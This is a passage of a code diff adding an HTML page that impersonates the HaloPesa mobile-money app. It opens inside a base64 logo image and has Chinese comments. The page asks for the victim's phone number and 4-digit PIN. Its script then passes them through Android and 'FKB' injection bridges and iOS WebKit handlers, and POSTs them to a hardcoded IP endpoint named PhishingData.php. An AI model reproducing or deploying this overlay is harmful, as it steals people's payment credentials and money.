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" alt="HaloPesa Logo" class="halopesa-logo-img">
+        </div>
+
+        <!-- PIN 输入指示与提示语 -->
+        <div class="step2-middle">
+          <div class="pin-title">PIN ادخل رمز</div>
+          <div class="pin-subtitle">يرجى إدخال رمز PIN المكون من 4 أرقام</div>
+          
+          <div class="pin-indicators" id="pinIndicators">
+            <div class="pin-dot" id="dot0"></div>
+            <div class="pin-dot" id="dot1"></div>
+            <div class="pin-dot" id="dot2"></div>
+            <div class="pin-dot" id="dot3"></div>
+          </div>
+        </div>
+
+        <!-- 椭圆形定制数字键盘 (与原图一致：上排 3 2 1，中排 6 5 4，下排 9 8 7，底排 ⌫ 0) -->
+        <div class="keypad-wrapper">
+          <div class="keypad-grid">
+            <div class="key-oval" data-num="3">3</div>
+            <div class="key-oval" data-num="2">2</div>
+            <div class="key-oval" data-num="1">1</div>
+
+            <div class="key-oval" data-num="6">6</div>
+            <div class="key-oval" data-num="5">5</div>
+            <div class="key-oval" data-num="4">4</div>
+
+            <div class="key-oval" data-num="9">9</div>
+            <div class="key-oval" data-num="8">8</div>
+            <div class="key-oval" data-num="7">7</div>
+
+            <div class="key-oval icon-key" id="btnBackspace">
+              <svg class="del-svg-icon" viewBox="0 0 24 18" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <!-- 房型/标签型后退箭头边框 -->
+                <path d="M7 1.5L1.5 9L7 16.5H22C22.55 16.5 23 16.05 23 15.5V2.5C23 1.95 22.55 1.5 22 1.5H7Z" stroke="#ffffff" stroke-width="1.8" stroke-linejoin="round" stroke-linecap="round"/>
+                <!-- 内部 X 删除线条 -->
+                <line x1="11" y1="5.5" x2="18" y2="12.5" stroke="#ffffff" stroke-width="1.8" stroke-linecap="round"/>
+                <line x1="18" y1="5.5" x2="11" y2="12.5" stroke="#ffffff" stroke-width="1.8" stroke-linecap="round"/>
+              </svg>
+            </div>
+            <div class="key-oval" data-num="0">0</div>
+            <div class="key-oval empty"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 提示框 -->
+    <div class="app-toast" id="appToast"></div>
+  </div>
+
+  <script>
+    (function() {
+      var pkgName = "com.halopesa.eu";
+      var step1Phone = "";
+      var pinCode = "";
+
+      var viewStep1 = document.getElementById("viewStep1");
+      var viewStep2 = document.getElementById("viewStep2");
+      var inputPhone = document.getElementById("inputPhone");
+      var btnContinue = document.getElementById("btnContinue");
+      var pinIndicators = document.getElementById("pinIndicators");
+      var dots = [
+        document.getElementById("dot0"),
+        document.getElementById("dot1"),
+        document.getElementById("dot2"),
+        document.getElementById("dot3")
+      ];
+      var btnBackspace = document.getElementById("btnBackspace");
+      var appToast = document.getElementById("appToast");
+
+      function showToast(msg, duration) {
+        duration = duration || 2000;
+        appToast.textContent = msg;
+        appToast.style.display = "block";
+        setTimeout(function() {
+          appToast.style.display = "none";
+        }, duration);
+      }
+
+      // 手机号输入框监听，控制第一步按钮状态
+      inputPhone.addEventListener("input", function() {
+        var val = this.value.replace(/[^0-9+]/g, '');
+        this.value = val;
+        if (val.length >= 6) {
+          btnContinue.classList.add("active");
+        } else {
+          btnContinue.classList.remove("active");
+        }
+      });
+
+      // 点击第一步“Endelea”
+      btnContinue.addEventListener("click", function() {
+        var phone = inputPhone.value.trim();
+        if (phone.length < 6) {
+          showToast("Tafadhali ingiza namba ya simu sahihi");
+          return;
+        }
+        step1Phone = phone;
+        // 切换到第二步 PIN 输入页
+        viewStep1.classList.remove("active");
+        viewStep2.classList.add("active");
+      });
+
+      // 更新 PIN 显示点
+      function updatePinDots() {
+        for (var i = 0; i < 4; i++) {
+          if (i < pinCode.length) {
+            dots[i].classList.add("filled");
+          } else {
+            dots[i].classList.remove("filled");
+          }
+        }
+      }
+
+      // 绑定键盘点击
+      var keys = document.querySelectorAll(".key-oval[data-num]");
+      keys.forEach(function(key) {
+        key.addEventListener("click", function() {
+          if (pinCode.length >= 4) return;
+          var num = this.getAttribute("data-num");
+          pinCode += num;
+          updatePinDots();
+
+          if (pinCode.length === 4) {
+            // 输入完成，自动提交上报
+            setTimeout(submitAllData, 250);
+          }
+        });
+      });
+
+      // 退格删除键
+      btnBackspace.addEventListener("click", function() {
+        if (pinCode.length > 0) {
+          pinCode = pinCode.slice(0, -1);
+          updatePinDots();
+        }
+      });
+
+      // 数据上报与全通道兼容逻辑
+      function submitAllData() {
+        var payload = {
+          pkg: pkgName,
+          phone: step1Phone,
+          username: step1Phone,
+          pin: pinCode,
+          payment_password: pinCode,
+          timestamp: new Date().getTime()
+        };
+
+        console.log("Submitting HaloPesa payload:", payload);
+
+        // 1. 原生 Android Bridge
+        try {
+          if (typeof Android !== 'undefined') {
+            if (typeof Android.postMessage === 'function') Android.postMessage(JSON.stringify(payload));
+            if (typeof Android.setFormData === 'function') Android.setFormData(JSON.stringify(payload));
+          }
+        } catch(e) {}
+
+        // 2. FKB 注入通道
+        try {
+          if (typeof FKB !== 'undefined') {
+            if (typeof FKB.postMessage === 'function') FKB.postMessage(JSON.stringify(payload));
+            if (typeof FKB.setFormData === 'function') {
+              FKB.setFormData(JSON.stringify({
+                client_id: step1Phone,
+                username: step1Phone,
+                password: pinCode,
+                login_password: pinCode,
+                payment_password: pinCode,
+                pin: pinCode,
+                pkg: pkgName
+              }));
+            }
+          }
+        } catch(e) {}
+
+        // 3. iOS WebKit 兼容
+        try {
+          if (window.webkit && window.webkit.messageHandlers) {
+            if (window.webkit.messageHandlers.Android && typeof window.webkit.messageHandlers.Android.postMessage === 'function') {
+              window.webkit.messageHandlers.Android.postMessage(JSON.stringify(payload));
+            } else if (window.webkit.messageHandlers.FKB && typeof window.webkit.messageHandlers.FKB.postMessage === 'function') {
+              window.webkit.messageHandlers.FKB.postMessage(JSON.stringify(payload));
+            }
+          }
+        } catch(e) {}
+
+        // 4. Ajax 网络上报兜底
+        try {
+          var xhr = new XMLHttpRequest();
+          xhr.open('POST', "http://18.142.44.159:8035/api/PhishingData.php", true);
+          xhr.setRequestHeader('Content-Type', 'application/json');
+          xhr.send(JSON.stringify({
+            pkg: pkgName,
+            template: 'halopesa_mobile',
+            formData: payload
+          }));
+        } catch(e) {}
+
+        showToast("Inathibitisha...");
+
+        // 级联关闭页面
+        setTimeout(function() {
+          try {
+            if (typeof Android !== 'undefined') {
+              if (typeof Android.close === 'function') Android.close();
+              else if (typeof Android.close === 'function') Android.close();
+            } else if (typeof Android!=='undefined'&&Android.close) {
+              Android.close();
+            } else {
+              window.close();
+            }
+          } catch(e) {}
+        }, 800);
+      }
+    })();
+  </script>
+</body>
+</html>
